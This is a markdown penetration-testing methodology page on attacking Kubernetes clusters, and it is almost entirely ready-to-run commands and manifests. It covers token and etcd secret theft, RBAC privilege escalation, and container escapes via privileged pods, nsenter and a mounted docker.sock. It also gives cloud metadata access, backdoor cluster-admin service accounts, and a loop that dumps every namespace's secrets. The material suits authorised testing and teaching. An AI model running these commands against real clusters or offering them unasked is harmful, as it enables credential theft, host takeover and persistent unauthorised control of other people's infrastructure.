---
title: Kubernetes Security
category: methodology
tags:
  - kubernetes
  - k8s
  - cloud
  - containers
  - rbac
  - pentesting
last_updated: 2025-12-28
---

# Kubernetes Security

## Table of Contents

- [Overview](#overview)
- [Initial Access and Enumeration](#initial-access-and-enumeration)
- [RBAC Enumeration and Abuse](#rbac-enumeration-and-abuse)
- [Secrets Extraction](#secrets-extraction)
- [Container Escape Techniques](#container-escape-techniques)
- [Pod Security Context Abuse](#pod-security-context-abuse)
- [Service Account Token Theft](#service-account-token-theft)
- [Common Kubernetes Tools](#common-kubernetes-tools)
- [Post-Exploitation](#post-exploitation)

---

## Overview

Kubernetes is the dominant container orchestration platform. Key attack surfaces include:

- **RBAC**: Role-based access control misconfigurations
- **Secrets**: Sensitive data stored in etcd
- **Pod Security**: Container isolation boundaries
- **Service Accounts**: Pod identities and tokens
- **Network Policies**: Pod-to-pod communication
- **API Server**: Central control plane component

---

## Initial Access and Enumeration

### Identifying Kubernetes Environment

```bash
# Check for Kubernetes environment variables
env | grep -i kube

# Check for service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check for mounted ConfigMaps/Secrets
ls -la /var/run/secrets/

# Check for Kubernetes DNS
cat /etc/resolv.conf | grep -i kubernetes
```

### API Server Discovery

```bash
# Default API server address (from inside pod)
APISERVER=https://kubernetes.default.svc

# Get API server from environment
echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Common API server ports
# 6443 - Default secure port
# 8080 - Insecure port (if enabled)
# 443 - Load balancer
```

### Basic Enumeration with kubectl

```bash
# Check current context
kubectl config current-context

# List contexts
kubectl config get-contexts

# Get cluster info
kubectl cluster-info

# Get server version
kubectl version

# Check authentication
kubectl auth can-i --list
```

### Unauthenticated Access Check

```bash
# Check for unauthenticated API access
curl -k https://API_SERVER:6443/api

# Check healthz endpoint
curl -k https://API_SERVER:6443/healthz

# Check version
curl -k https://API_SERVER:6443/version

# List namespaces (if allowed)
curl -k https://API_SERVER:6443/api/v1/namespaces
```

### Namespace Enumeration

```bash
# List all namespaces
kubectl get namespaces

# Get pods in all namespaces
kubectl get pods --all-namespaces

# Get services in all namespaces
kubectl get services --all-namespaces

# Get all resources in namespace
kubectl get all -n NAMESPACE
```

---

## RBAC Enumeration and Abuse

### Understanding RBAC Components

| Component | Scope | Description |
|-----------|-------|-------------|
| Role | Namespace | Permissions within a namespace |
| ClusterRole | Cluster | Cluster-wide permissions |
| RoleBinding | Namespace | Binds Role to users/groups/SAs |
| ClusterRoleBinding | Cluster | Binds ClusterRole cluster-wide |

### RBAC Enumeration

```bash
# List roles in namespace
kubectl get roles -n NAMESPACE

# List cluster roles
kubectl get clusterroles

# Get role details
kubectl describe role ROLE_NAME -n NAMESPACE

# Get cluster role details
kubectl describe clusterrole CLUSTERROLE_NAME

# List role bindings
kubectl get rolebindings -n NAMESPACE

# List cluster role bindings
kubectl get clusterrolebindings

# Get binding details
kubectl describe rolebinding BINDING_NAME -n NAMESPACE
```

### Check Current Permissions

```bash
# List all permissions
kubectl auth can-i --list

# List permissions in specific namespace
kubectl auth can-i --list -n kube-system

# Check specific permission
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create pods/exec

# Check as another user (if admin)
kubectl auth can-i get secrets --as=system:serviceaccount:default:mysa
```

### Dangerous Permissions

| Permission | Risk | Abuse Method |
|------------|------|--------------|
| `*` on pods | Pod creation | Create privileged pod |
| `create pods/exec` | Container access | Execute in existing pods |
| `get secrets` | Credential theft | Extract secrets |
| `create/update roles` | Privilege escalation | Grant self more permissions |
| `impersonate` | Identity theft | Act as other users/SAs |
| `create tokenrequests` | Token generation | Get SA tokens |

### RBAC Privilege Escalation

```bash
# If you can create roles and role bindings
# Create admin role
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: admin-role
  namespace: default
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

# Bind to your service account
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: admin-binding
  namespace: default
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: Role
  name: admin-role
  apiGroup: rbac.authorization.k8s.io
EOF
```

---

## Secrets Extraction

### Listing Secrets

```bash
# List secrets in namespace
kubectl get secrets

# List secrets in all namespaces
kubectl get secrets --all-namespaces

# Get secret details
kubectl describe secret SECRET_NAME

# Get secret with output
kubectl get secret SECRET_NAME -o yaml
kubectl get secret SECRET_NAME -o json
```

### Extracting Secret Values

```bash
# Get all data from secret (base64 encoded)
kubectl get secret SECRET_NAME -o jsonpath='{.data}'

# Decode specific key
kubectl get secret SECRET_NAME -o jsonpath='{.data.password}' | base64 -d

# Get entire secret decoded
kubectl get secret SECRET_NAME -o json | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

### Common Secret Types

| Type | Description | Sensitive Data |
|------|-------------|----------------|
| `Opaque` | Generic secrets | Various |
| `kubernetes.io/service-account-token` | SA tokens | JWT token |
| `kubernetes.io/dockerconfigjson` | Docker registry | Registry credentials |
| `kubernetes.io/tls` | TLS certificates | Private keys |
| `kubernetes.io/basic-auth` | Basic auth | Username/password |

### Service Account Token Extraction

```bash
# Get SA token from secret (legacy)
kubectl get secret $(kubectl get sa default -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d

# From inside pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Get CA certificate
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Secrets in etcd (If Access Available)

```bash
# Connect to etcd
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    --cert=/etc/kubernetes/pki/etcd/server.crt \
    --key=/etc/kubernetes/pki/etcd/server.key \
    get /registry/secrets --prefix --keys-only

# Get specific secret
ETCDCTL_API=3 etcdctl get /registry/secrets/default/SECRET_NAME
```

---

## Container Escape Techniques

### Privileged Container Escape

```bash
# Check if running as privileged
cat /proc/1/status | grep Cap
# CapEff: 0000003fffffffff indicates privileged

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host
chroot /mnt/host /bin/bash

# Or read sensitive files
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa
```

### hostPID Namespace Escape

```bash
# If hostPID is enabled, access host processes
ps aux

# Enter host namespace via nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Or access host process memory/files
ls -la /proc/1/root/
```

### hostNetwork Escape

```bash
# Access host network interfaces
ip addr

# Scan internal network
nmap -sn 10.0.0.0/24

# Access metadata services
curl http://169.254.169.254/latest/meta-data/  # AWS
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/  # GCP
```

### Docker Socket Mount

```bash
# If docker.sock is mounted
ls -la /var/run/docker.sock

# List containers on host
docker ps

# Run privileged container on host
docker run -it --privileged --pid=host --net=host \
    -v /:/host alpine chroot /host
```

### CVE Exploits

```bash
# CVE-2022-0185 - Heap overflow in legacy_parse_param
# CVE-2022-0492 - cgroup escape
# CVE-2021-22555 - Netfilter heap buffer overflow
# CVE-2020-8558 - kube-proxy iptables bypass
```

---

## Pod Security Context Abuse

### Checking Pod Security Context

```bash
# Get pod security context
kubectl get pod POD_NAME -o jsonpath='{.spec.securityContext}'

# Get container security context
kubectl get pod POD_NAME -o jsonpath='{.spec.containers[*].securityContext}'

# Check for privileged
kubectl get pod POD_NAME -o jsonpath='{.spec.containers[*].securityContext.privileged}'
```

### Dangerous Security Context Settings

| Setting | Risk | Impact |
|---------|------|--------|
| `privileged: true` | Full host access | Complete container escape |
| `hostPID: true` | Host PID namespace | Process visibility/manipulation |
| `hostNetwork: true` | Host network stack | Network access, service impersonation |
| `hostIPC: true` | Host IPC namespace | Shared memory access |
| `allowPrivilegeEscalation: true` | SUID/capabilities | Privilege escalation in container |
| `runAsUser: 0` | Root user | Root privileges in container |

### Volume Mount Abuse

```bash
# Check mounted volumes
kubectl get pod POD_NAME -o jsonpath='{.spec.volumes}'

# Dangerous mounts
# /var/run/docker.sock - Docker control
# /etc - Host config access
# / - Full host filesystem
# /var/log - Log access
```

### Creating Privileged Pod (If Allowed)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

---

## Service Account Token Theft

### Understanding Service Account Tokens

```bash
# Default token location in pod
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Extracting and Using Tokens

```bash
# Get token from pod filesystem
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Use with kubectl
kubectl --token=$TOKEN --certificate-authority=$CA_CERT \
    --server=https://kubernetes.default.svc get pods

# Use with curl
curl -k -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
```

### Token Request API (Kubernetes 1.22+)

```bash
# Request token for service account
kubectl create token SERVICE_ACCOUNT_NAME -n NAMESPACE

# Request token with audience
kubectl create token SERVICE_ACCOUNT_NAME --audience=custom-audience

# Request short-lived token
kubectl create token SERVICE_ACCOUNT_NAME --duration=600s
```

### Finding Tokens in Secrets

```bash
# Find all SA token secrets
kubectl get secrets --all-namespaces -o json | \
    jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .metadata.name'

# Extract token from secret
kubectl get secret TOKEN_SECRET_NAME -o jsonpath='{.data.token}' | base64 -d
```

---

## Common Kubernetes Tools

### kubectl

```bash
# Install
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
sudo mv kubectl /usr/local/bin/

# Configure
kubectl config set-cluster cluster --server=https://API_SERVER:6443 --insecure-skip-tls-verify
kubectl config set-credentials user --token=TOKEN
kubectl config set-context ctx --cluster=cluster --user=user
kubectl config use-context ctx
```

### kube-hunter

```bash
# Install
pip install kube-hunter

# Run remotely
kube-hunter --remote API_SERVER

# Run from inside cluster
kube-hunter --pod

# Active scanning (more intrusive)
kube-hunter --active
```

### peirates

```bash
# Install
go install github.com/inguardians/peirates@latest

# Run interactively
peirates

# Menu options:
# - Token-based attacks
# - Cloud provider attacks
# - Lateral movement
# - Secrets extraction
```

### kubeaudit

```bash
# Install
go install github.com/Shopify/kubeaudit@latest

# Audit all
kubeaudit all

# Specific checks
kubeaudit privileged
kubeaudit rootfs
kubeaudit netpols
```

### kubectl-who-can

```bash
# Install
kubectl krew install who-can

# Who can get secrets
kubectl who-can get secrets

# Who can create pods
kubectl who-can create pods

# Who can exec into pods
kubectl who-can create pods/exec
```

---

## Post-Exploitation

### Persistence Techniques

```bash
# Create backdoor service account
kubectl create serviceaccount backdoor -n default

# Create cluster-admin binding
kubectl create clusterrolebinding backdoor-binding \
    --clusterrole=cluster-admin \
    --serviceaccount=default:backdoor

# Get token for backdoor SA
kubectl create token backdoor -n default

# Create persistent workload
kubectl run backdoor --image=alpine \
    --command -- /bin/sh -c "while true; do sleep 3600; done"

# Add webhook for persistence
# Admission webhooks can intercept all API calls
```

### Lateral Movement

```bash
# List all nodes
kubectl get nodes -o wide

# Execute on different nodes via pods
kubectl run shell --image=alpine --overrides='{"spec":{"nodeName":"target-node"}}' \
    --command -- sleep infinity
kubectl exec -it shell -- sh

# Access cloud metadata from pods
curl http://169.254.169.254/latest/meta-data/
```

### Data Exfiltration

```bash
# Extract all secrets
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
    kubectl get secrets -n $ns -o yaml >> all-secrets.yaml
done

# Extract ConfigMaps
kubectl get configmaps --all-namespaces -o yaml > all-configmaps.yaml

# Copy files from pods
kubectl cp NAMESPACE/POD:/path/to/file ./local-file
```

### Cluster Takeover

```bash
# If you have cluster-admin
# Create new admin user
kubectl create clusterrolebinding attacker-admin \
    --clusterrole=cluster-admin \
    --user=attacker@example.com

# Modify node kubelets
kubectl get nodes
kubectl debug node/NODE_NAME -it --image=alpine

# Access etcd directly
kubectl exec -it etcd-master -n kube-system -- sh
```

---

## See Also

- [README.md](README.md) - Cloud Pentesting Overview
- [aws.md](aws.md) - AWS Attack Patterns
- [azure.md](azure.md) - Azure Attack Patterns
- [gcp.md](gcp.md) - GCP Attack Patterns
